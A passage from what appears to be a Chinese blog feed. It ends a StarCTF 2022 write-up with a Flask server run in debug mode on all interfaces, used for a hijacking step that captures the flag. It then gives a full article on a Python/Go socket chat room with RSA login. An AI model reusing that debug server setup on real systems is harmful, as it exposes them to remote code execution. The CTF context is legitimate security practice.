&#x3D;&#x3D; &quot;__main__&quot;:    app.run(debug&#x3D;True, host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8068)</code></pre><p>即可同时达成劫持与内容相等，获得 flag。</p><img src="/article/starctf2022/(null)-20220421125559634.(null)" class="" title="img" loading="lazy"><hr><p>其他方向的题目由于我没做就不写啦</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Socket网络通信编程项目</title>
      <link href="article/socket/"/>
      <url>article/socket/</url>
      
        <content type="html"><![CDATA[<p>基于多种编程语言组成的聊天室系统</p><span id="more"></span><h2 id="Socket网络通信编程项目"><a href="#Socket网络通信编程项目" class="headerlink" title="Socket网络通信编程项目"></a>Socket网络通信编程项目</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>为深入研究socket编程，本人开发应用了一套socket通信编程项目，旨在深入学习其原理和实现方法。本人独立实现了方案一，并参与帮助完成了方案二。</p><h3 id="项目功能简介"><a href="#项目功能简介" class="headerlink" title="项目功能简介"></a>项目功能简介</h3><p>本项目实现网络聊天室的功能，可以进行多人在线聊天，自定义昵称并记录历史记录和发言时间。利用socket编程，多线程和队列，能够使得任意加入server的客户端进行通信，其中服务端模块用Python语言在Linux系统上完成开发，而客户端模块用Go语言在Windows系统上完成开发，系统具有跨平台跨语言分布特性。其中在认证方面还设计了RSA加密，以保证认证通信的保密性。</p><p>项目链接：<a href="https://err0r.top/article/socket/">https://err0r.top/article/socket/</a></p><h3 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h3><p>方案一：项目包括客户端和服务端两个部分，其中服务端模块用Python语言在Linux系统上完成开发，而客户端模块用Go语言在Windows系统上完成开发，系统具有跨平台跨语言分布特性。</p><p>方案二：项目包括客户端和服务端两个部分，其中服务端模块用C语言在Linux系统上完成开发，而客户端模块用Python语言在Windows系统上完成开发，系统具有跨平台跨语言分布特性。</p><h3 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>程序流程图</p><img src="/article/socket/image-20220323201658269.png" class="" title="image-20220323201658269" loading="lazy"><p>在Linux操作系统中，运行server.py程序，可以启动服务端，在Windows操作系统中，再运行goClient.exe程序，可以启动客户端。在弹出的聊天室窗口输入服务端IP和端口，若输入正确则服务端连接成功并打印“conn success！”，若输入错误则窗口消失。在服务端连接成功后，输入用户名则可以开始聊天，在聊天窗口输入histroy，则可以查看所以历史记录。</p><p>服务端窗口：</p><img src="/article/socket/server.png" class="" title="server" loading="lazy"><p>客户端窗口：</p><img src="/article/socket/client1.png" class="" title="client1" loading="lazy"><img src="/article/socket/client2.png" class="" title="client2" loading="lazy"><h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>在Linux操作系统中，运行netdemo.c程序，可以启动服务端，在Windows操作系统中，再运行test2.py程序，可以启动客户端。在服务端和客户端启动成功后，输入用户名登录成功后则可以开始聊天。</p><p>服务端窗口：</p><img src="/article/socket/TU4-0760934.png" class="" title="TU4" loading="lazy"><p>客户端登录窗口：</p><img src="/article/socket/TU1.png" class="" title="TU1" loading="lazy"><p>客户端登录成功：</p><img src="/article/socket/TU2-0761014.png" class="" title="TU2" loading="lazy"><p>聊天窗口：</p><img src="/article/socket/TU3.png" class="" title="TU3" loading="lazy"><h3 id="代码结构说明"><a href="#代码结构说明" class="headerlink" title="代码结构说明"></a>代码结构说明</h3><p>各函数名称和所实现功能列表如下：</p><h4 id="方案一：-1"><a href="#方案一：-1" class="headerlink" title="方案一："></a>方案一：</h4><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>rsa_decrypt()</td><td>用于rsa解密</td></tr><tr><td>rsa_encrypt()</td><td>用于rsa加密</td></tr><tr><td>printStackTrace()</td><td>用于debug调试，输出错误信息</td></tr><tr><td>vertify()</td><td>用于认证模块</td></tr><tr><td>game()</td><td>主流程模块</td></tr><tr><td>thread_task()</td><td>线程任务</td></tr><tr><td>socket_task()</td><td>套接字处理</td></tr><tr><td>init_Thread()</td><td>线程初始化</td></tr><tr><td>init_Process()</td><td>进程初始化</td></tr></tbody></table><h4 id="方案二：-1"><a href="#方案二：-1" class="headerlink" title="方案二："></a>方案二：</h4><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>login_socket()</td><td>客户端与服务端进行socket连接</td></tr><tr><td>ChatUI()</td><td>聊天窗口UI</td></tr><tr><td>sendMsgEvent()</td><td>实现回车登录或发送消息</td></tr><tr><td>senddata()</td><td>发送数据</td></tr><tr><td>recvdata()</td><td>接收数据</td></tr><tr><td>close()</td><td>关闭程序</td></tr></tbody></table><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="方案一：-2"><a href="#方案一：-2" class="headerlink" title="方案一："></a>方案一：</h4><p>在实现rsa解密功能时，借助了rsa_decrypt()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rsa_decrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""校验RSA加密 使用私钥进行解密"""</span>    private_key <span class="token operator">=</span> <span class="token triple-quoted-string string">'''私钥，略'''</span>    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span><span class="token punctuation">)</span>    retval <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'ERROR'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retval<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment"># 去除换行符</span></code></pre><p>在实现rsa加密功能时，借助了rsa_encrypt()函数，关键代码为：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rsa_encrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    PUBLIC_KEY <span class="token operator">=</span> <span class="token triple-quoted-string string">'''公钥，略'''</span>    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>PUBLIC_KEY<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher_text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> cipher_text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span></code></pre><p>在实现debug调试，输出错误信息功能时，借助了printStackTrace(函数，关键代码为：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">printStackTrace</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> current_name<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        info <span class="token operator">=</span> <span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>current_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" Error: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nat "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>            e<span class="token punctuation">.</span>__traceback__<span class="token punctuation">.</span>tb_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__file__"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nat line: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>__traceback__<span class="token punctuation">.</span>tb_lineno<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>        <span class="token comment"># 写入文件</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"logs.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> logger<span class="token punctuation">:</span>            logger<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span></code></pre><p>连接建立后，需要对用户进行认证，这里接收用户名后利用rsa解密，解密成功即使用了正确的客户端，否则服务端会断开于客户端的连接</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">vertify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket_handle<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    前段略    """</span>        name <span class="token operator">=</span> socket_handle<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> self<span class="token punctuation">.</span>rsa_decrypt<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s has entered!"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 防止并发错误</span>        lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 写入消息和历史记录</span>        history<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"[!] "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":has entered!"</span><span class="token punctuation">)</span>        tmp_message<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span> <span class="token string">"view_names"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"[!] "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":has entered!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 认证完成后接入主聊天流程</span>        self<span class="token punctuation">.</span>game<span class="token punctuation">(</span>socket_handle<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># 出错说明认证失败，断开连接</span>        socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"\n[-] Please use the authentication client to connect!"</span><span class="token punctuation">)</span>        socket_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">game</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket_handle<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""    前段略    """</span>      <span class="token comment"># 挂起程序，防止退出</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tmp_message<span class="token punctuation">:</span>              <span class="token comment"># 对每个消息都进行处理</span>                <span class="token keyword">for</span> item <span class="token keyword">in</span> tmp_message<span class="token punctuation">:</span>                  <span class="token comment"># 如果发送人非本人，且本人不在"已阅消息"列表，则发送客户端此消息，并添加到已阅列表</span>                    <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> name <span class="token keyword">and</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> item<span class="token punctuation">[</span><span class="token string">"view_names"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                        socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> item<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 防止并发错误</span>                        lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                        item<span class="token punctuation">[</span><span class="token string">"view_names"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                        lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>            socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"\n>> "</span><span class="token punctuation">)</span>            <span class="token comment"># 接收客户端消息</span>            msg <span class="token operator">=</span> socket_handle<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> msg<span class="token punctuation">:</span>              <span class="token comment"># 如果客户端输入了"history"，则返回全部历史信息</span>                <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">"history"</span><span class="token punctuation">:</span>                    <span class="token comment"># print(history)</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> history<span class="token punctuation">:</span>                        socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                  <span class="token comment"># 否则即为正常消息，防止并发冲突</span>                    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment"># 添加至历史记录</span>                    history<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span>                  <span class="token comment"># 添加至待处理消息list中，其中每条消息都是发送人，已阅列表，信息内容三个关键字组成的字典</span>                    tmp_message<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span> <span class="token string">"view_names"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>      <span class="token comment"># 最终关闭连接</span>        socket_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其中有进程任务，即处理每个连接的客户端送至认证模块中</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">thread_task</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> queue<span class="token punctuation">.</span>unfinished_tasks<span class="token punctuation">:</span>          <span class="token comment"># 队列取还未认证的套接字</span>            item <span class="token operator">=</span> queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>vertify<span class="token punctuation">(</span>item<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span>e<span class="token punctuation">,</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">init_Thread</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>threading_nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        item <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>thread_task<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Thread"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        item<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        item<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>进程任务是由线程任务触发的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">socket_task</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 套接字任务，初始化线程</span>    self<span class="token punctuation">.</span>init_Thread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">" OK, under Threads:"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>threading_nums<span class="token punctuation">,</span> <span class="token string">"OK"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>          <span class="token comment"># 挂起，持续接收连接的套接字</span>            socket_handle<span class="token punctuation">,</span> address <span class="token operator">=</span> self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment"># 长超时设置</span>            socket_handle<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">999999</span><span class="token punctuation">)</span>          <span class="token comment"># 收到了就将其put到队列中，等待线程处理</span>            queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>socket_handle<span class="token punctuation">)</span>            info <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" Accepting Connection from: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>          <span class="token comment"># 写日志</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"logs.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> logger<span class="token punctuation">:</span>                logger<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        self<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span>e<span class="token punctuation">,</span> multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_Process</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start init..."</span><span class="token punctuation">)</span>    <span class="token comment"># 初始化多进程</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>process_nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>socket_task<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Process"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>主函数仅做后台挂起，直接初始化进程后挂后台</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>init_Process<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">60000</span><span class="token punctuation">)</span></code></pre><h4 id="方案二：-2"><a href="#方案二：-2" class="headerlink" title="方案二："></a>方案二：</h4><p>在实现客户端与服务端socket连接功能时，借助了login_socket()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># try:</span>        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>input_username<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'message'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'请输入用户名'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>local<span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token boolean">True</span>            self<span class="token punctuation">.</span>username_data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>input_username<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>            self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>username_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> ret <span class="token operator">==</span> <span class="token string">b'Y'</span><span class="token punctuation">:</span>                tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'登录成功！'</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>is_login <span class="token operator">=</span> <span class="token boolean">False</span>                ClientUI<span class="token punctuation">.</span>ChatUI<span class="token punctuation">(</span>self<span class="token punctuation">)</span>            <span class="token keyword">elif</span> ret <span class="token operator">==</span> <span class="token string">b'N'</span><span class="token punctuation">:</span>                tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'message'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'请输入用户名！'</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">elif</span> ret <span class="token operator">==</span> <span class="token string">b'R'</span><span class="token punctuation">:</span>                tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'message'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名重复！'</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Login Done!\n"</span><span class="token punctuation">)</span></code></pre><p>在实现聊天窗口UI功能时，借助了ChatUI()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ChatUI</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>title <span class="token operator">+=</span> self<span class="token punctuation">.</span>username_data    self<span class="token punctuation">.</span>root<span 